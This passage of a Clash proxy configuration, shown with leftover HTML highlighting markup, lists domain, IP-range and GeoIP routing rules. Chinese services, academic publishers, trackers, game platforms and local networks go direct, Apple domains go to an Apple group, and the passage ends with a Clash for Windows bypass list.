DOMAIN-SUFFIX,taobao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tmall.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tmall.hk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ykimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,youku.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiami.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiami.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Baidu</span></span><br><span class="line">- DOMAIN-SUFFIX,baidu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,baidubcr.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bdstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,yunjiasu-cdn.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; bilibili</span></span><br><span class="line">- DOMAIN-SUFFIX,acgvideo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,biliapi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,biliapi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bilibili.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bilibili.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdslb.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Blizzard</span></span><br><span class="line">- DOMAIN-SUFFIX,blizzard.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,battle.net,DIRECT</span><br><span class="line">- DOMAIN,blzddist1-a.akamaihd.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ByteDance</span></span><br><span class="line">- DOMAIN-SUFFIX,feiliao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,pstatp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snssdk.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iesdouyin.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,toutiao.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; CCTV</span></span><br><span class="line">- DOMAIN-SUFFIX,cctv.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cctvpic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,livechina.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; DiDi</span></span><br><span class="line">- DOMAIN-SUFFIX,didialift.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,didiglobal.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,udache.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 蛋蛋赞</span></span><br><span class="line">- DOMAIN-SUFFIX,343480.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,baduziyuan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,com-hs-hkdy.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,czybjz.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dandanzan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,fjhps.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kuyunbo.club,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaNet</span></span><br><span class="line">- DOMAIN-SUFFIX,21cn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HunanTV</span></span><br><span class="line">- DOMAIN-SUFFIX,hitv.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mgtv.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; iQiyi</span></span><br><span class="line">- DOMAIN-SUFFIX,iqiyi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iqiyipic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,71.am.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; JD</span></span><br><span class="line">- DOMAIN-SUFFIX,jd.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jd.hk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jdpay.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,360buyimg.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Kingsoft</span></span><br><span class="line">- DOMAIN-SUFFIX,iciba.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ksosoft.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Meitu</span></span><br><span class="line">- DOMAIN-SUFFIX,meitu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meitudata.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meitustat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meipai.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; MI</span></span><br><span class="line">- DOMAIN-SUFFIX,duokan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mi-img.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,miui.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,miwifi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiaomi.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Microsoft</span></span><br><span class="line">- DOMAIN-SUFFIX,microsoft.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,msecnd.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,office365.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,outlook.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,s-microsoft.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,visualstudio.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,windows.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,windowsupdate.com,DIRECT</span><br><span class="line">- DOMAIN,officecdn-microsoft-com.akamaized.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; NetEase</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,NeteaseMusic*,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,163.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,126.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,127.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,163yun.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,lofter.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,netease.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ydstatic.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sina</span></span><br><span class="line">- DOMAIN-SUFFIX,sina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weibo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weibocdn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sohu</span></span><br><span class="line">- DOMAIN-SUFFIX,sohu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sohucs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sohu-inc.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,v-56.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Sogo</span></span><br><span class="line">- DOMAIN-SUFFIX,sogo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sogou.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sogoucdn.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Steam</span></span><br><span class="line">- DOMAIN-SUFFIX,steampowered.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steam-chat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamgames.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamusercontent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamcontent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamcdn-a.akamaihd.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,steamstat.us,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Tencent</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,MicroMessenger%20Client,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,WeChat*,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,gtimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,idqqimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,igamecj.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myqcloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qq.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,servicewechat.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tencent.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tencent-cloud.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tenpay.com,DIRECT</span><br><span class="line">- DOMAIN,file-igamecj.akamaized.net,DIRECT</span><br><span class="line">- IP-CIDR,182.254.116.0/24,DIRECT</span><br><span class="line">- IP-CIDR,203.205.252.0/23,DIRECT</span><br><span class="line">- IP-CIDR,203.205.254.0/23,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; YYeTs</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,YYeTs*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,jstucdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zimuzu.io,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zimuzu.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmz2019.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzapi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzapi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzfile.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Content Delivery Network</span></span><br><span class="line">- DOMAIN-SUFFIX,ccgslb.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ccgslb.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chinanetcenter.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meixincdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ourdvs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,staticdn.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,wangsu.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; IP Query</span></span><br><span class="line">- DOMAIN-SUFFIX,ipip.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ip.la,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ip-cdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ipv6-test.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,test-ipv6.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,whatismyip.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Speed Test</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,speedtest.net,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,netspeedtestmaster.com,DIRECT</span><br><span class="line">- DOMAIN,speedtest.macpaw.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Private Tracker</span></span><br><span class="line">- DOMAIN-SUFFIX,awesome-hd.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,broadcasthe.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chdbits.co,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,classix-unlimited.co.uk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,empornium.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gazellegames.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdchina.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdsky.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,icetorrent.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jpopsuki.eu,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,keepfrds.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,madsrevolution.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,m-team.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nanyangpt.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ncore.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,open.cd,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ourbits.club,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,passthepopcorn.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,privatehd.to,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,redacted.ch,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springsunday.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tjupt.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,totheglory.im,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Scholar</span></span><br><span class="line">- DOMAIN-SUFFIX,acm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,acs.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aip.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ams.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,annualreviews.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aps.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ascelibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,asm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,asme.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,astm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bmj.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cambridge.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cas.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,clarivate.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ebscohost.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,emerald.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,engineeringvillage.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,icevirtuallibrary.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ieee.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,imf.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iop.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jamanetwork.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jhu.edu,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jstor.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,karger.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,libguides.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,madsrevolution.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mpg.de,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myilibrary.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nature.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oecd-ilibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,osapublishing.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oup.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ovid.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordartonline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordbibliographies.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordmusiconline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,pnas.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,proquest.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,rsc.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sagepub.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sciencedirect.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sciencemag.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,scopus.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,siam.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,spiedigitallibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springerlink.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tandfonline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,un.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,uni-bielefeld.de,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,webofknowledge.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,westlaw.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,wiley.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,worldbank.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,worldscientific.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Plex Media Server</span></span><br><span class="line">- DOMAIN-SUFFIX,plex.tv,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Other</span></span><br><span class="line">- DOMAIN-SUFFIX,cn,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,360in.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,51ym.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,8686c.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,abchina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,accuweather.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aicoinstorge.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,air-matters.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,air-matters.io,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aixifan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,amd.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,b612.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bdatu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,beitaichufang.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bjango.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,booking.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cailianpress.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,camera360.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chinaso.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chua.pro,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chuimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chunyu.mobi,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chushou.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cmbchina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cmbimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ctrip.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dfcfw.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,docschina.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,douban.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,doubanio.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,douyu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dxycdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dytt8.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,eastmoney.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,eudic.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,feng.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,fengkongcloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,frdic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,futu5.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,futunn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gandi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,geilicdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,getpricetag.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gifshow.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,godic.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hicloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hongxiu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hostbuf.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,huxiucdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,huya.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,infinitynewtab.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ithome.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,java.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jidian.im,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kaiyanapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kaspersky-labs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,keepcdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kkmh.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,licdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,linkedin.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,loli.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,luojilab.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,maoyan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,maoyun.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meituan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meituan.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mobike.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,moke.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mubu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myzaker.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nim-lang-cn.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nvidia.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oracle.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,paypal.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,paypalobjects.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qdaily.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qidian.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qyer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qyerstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,raychase.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ronghub.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ruguoapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,s-reader.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sankuai.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,scomper.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,seafile.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sm.ms,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,smzdm.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snapdrop.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snwx.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sspai.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,takungpao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,teamviewer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tianyancha.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,udacity.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,uning.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,vmware.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weather.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weico.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weidian.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiachufang.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ximalaya.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xinhuanet.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xmcdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,yangkeduo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhangzishi.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhihu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhuihd.com,DIRECT</span><br><span class="line">- DOMAIN,download.jetbrains.com,DIRECT</span><br><span class="line">- DOMAIN,images-cn.ssl-images-amazon.com,DIRECT</span><br><span class="line">- DOMAIN,cdn.angruo.com,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Apple</span></span><br><span class="line">- DOMAIN-SUFFIX,aaplimg.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.co,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.com.cn,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple-cloudkit.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,appstore.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,cdn-apple.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,crashlytics.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud.com.cn,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud-content.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,me.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,mzstatic.com,Apple</span><br><span class="line">- DOMAIN,www-cdn.icloud.com.akadns.net,Apple</span><br><span class="line">- IP-CIDR,17.0.0.0/8,Apple,no-resolve</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Local Area Network</span></span><br><span class="line">- IP-CIDR,192.168.0.0/16,DIRECT</span><br><span class="line">- IP-CIDR,10.0.0.0/8,DIRECT</span><br><span class="line">- IP-CIDR,172.16.0.0/12,DIRECT</span><br><span class="line">- IP-CIDR,127.0.0.0/8,DIRECT</span><br><span class="line">- IP-CIDR,100.64.0.0/10,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">DNSPod Public DNS+</span></span><br><span class="line">- IP-CIDR,119.28.28.28/32,DIRECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">GeoIP China</span></span><br><span class="line">- GEOIP,CN,DIRECT</span><br><span class="line"></span><br><span class="line">- MATCH,Final</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Clash <span class="keyword">for</span> Windows</span></span><br><span class="line">cfw-bypass:</span><br><span class="line">  - qq.com</span><br><span class="line">  - music.163.com</span><br><span class="line">  - &#x27;*.music.126.net&#x27;</span><br><span class="line">  - localhost</span><br><span class="line">  - 127.*</span><br><span class="line">  - 10.*</span><br><span class="line">  - 172.16.*</span><br><span class="line">  - 172.17.*</span><br><span class="line">  - 172.18.*</span><br><span class="line">  - 172.19.*</span><br><span class="line">  - 172.20.*</span><br><span class="line">  - 172.21.*</span><br><span class="line">  - 172.22.*</span><br><span class="line">  - 172.23.*</span><br><span class="line">  - 172.24.*</span><br><span class="line">  - 172.25.*</span><br><span class="line">  - 172.26.*</span><br><span class="line">  - 172.27.*</span><br><span class="line">  - 172.28.*</span><br><span class="line">  - 172.29.*</span><br><span class="line">  - 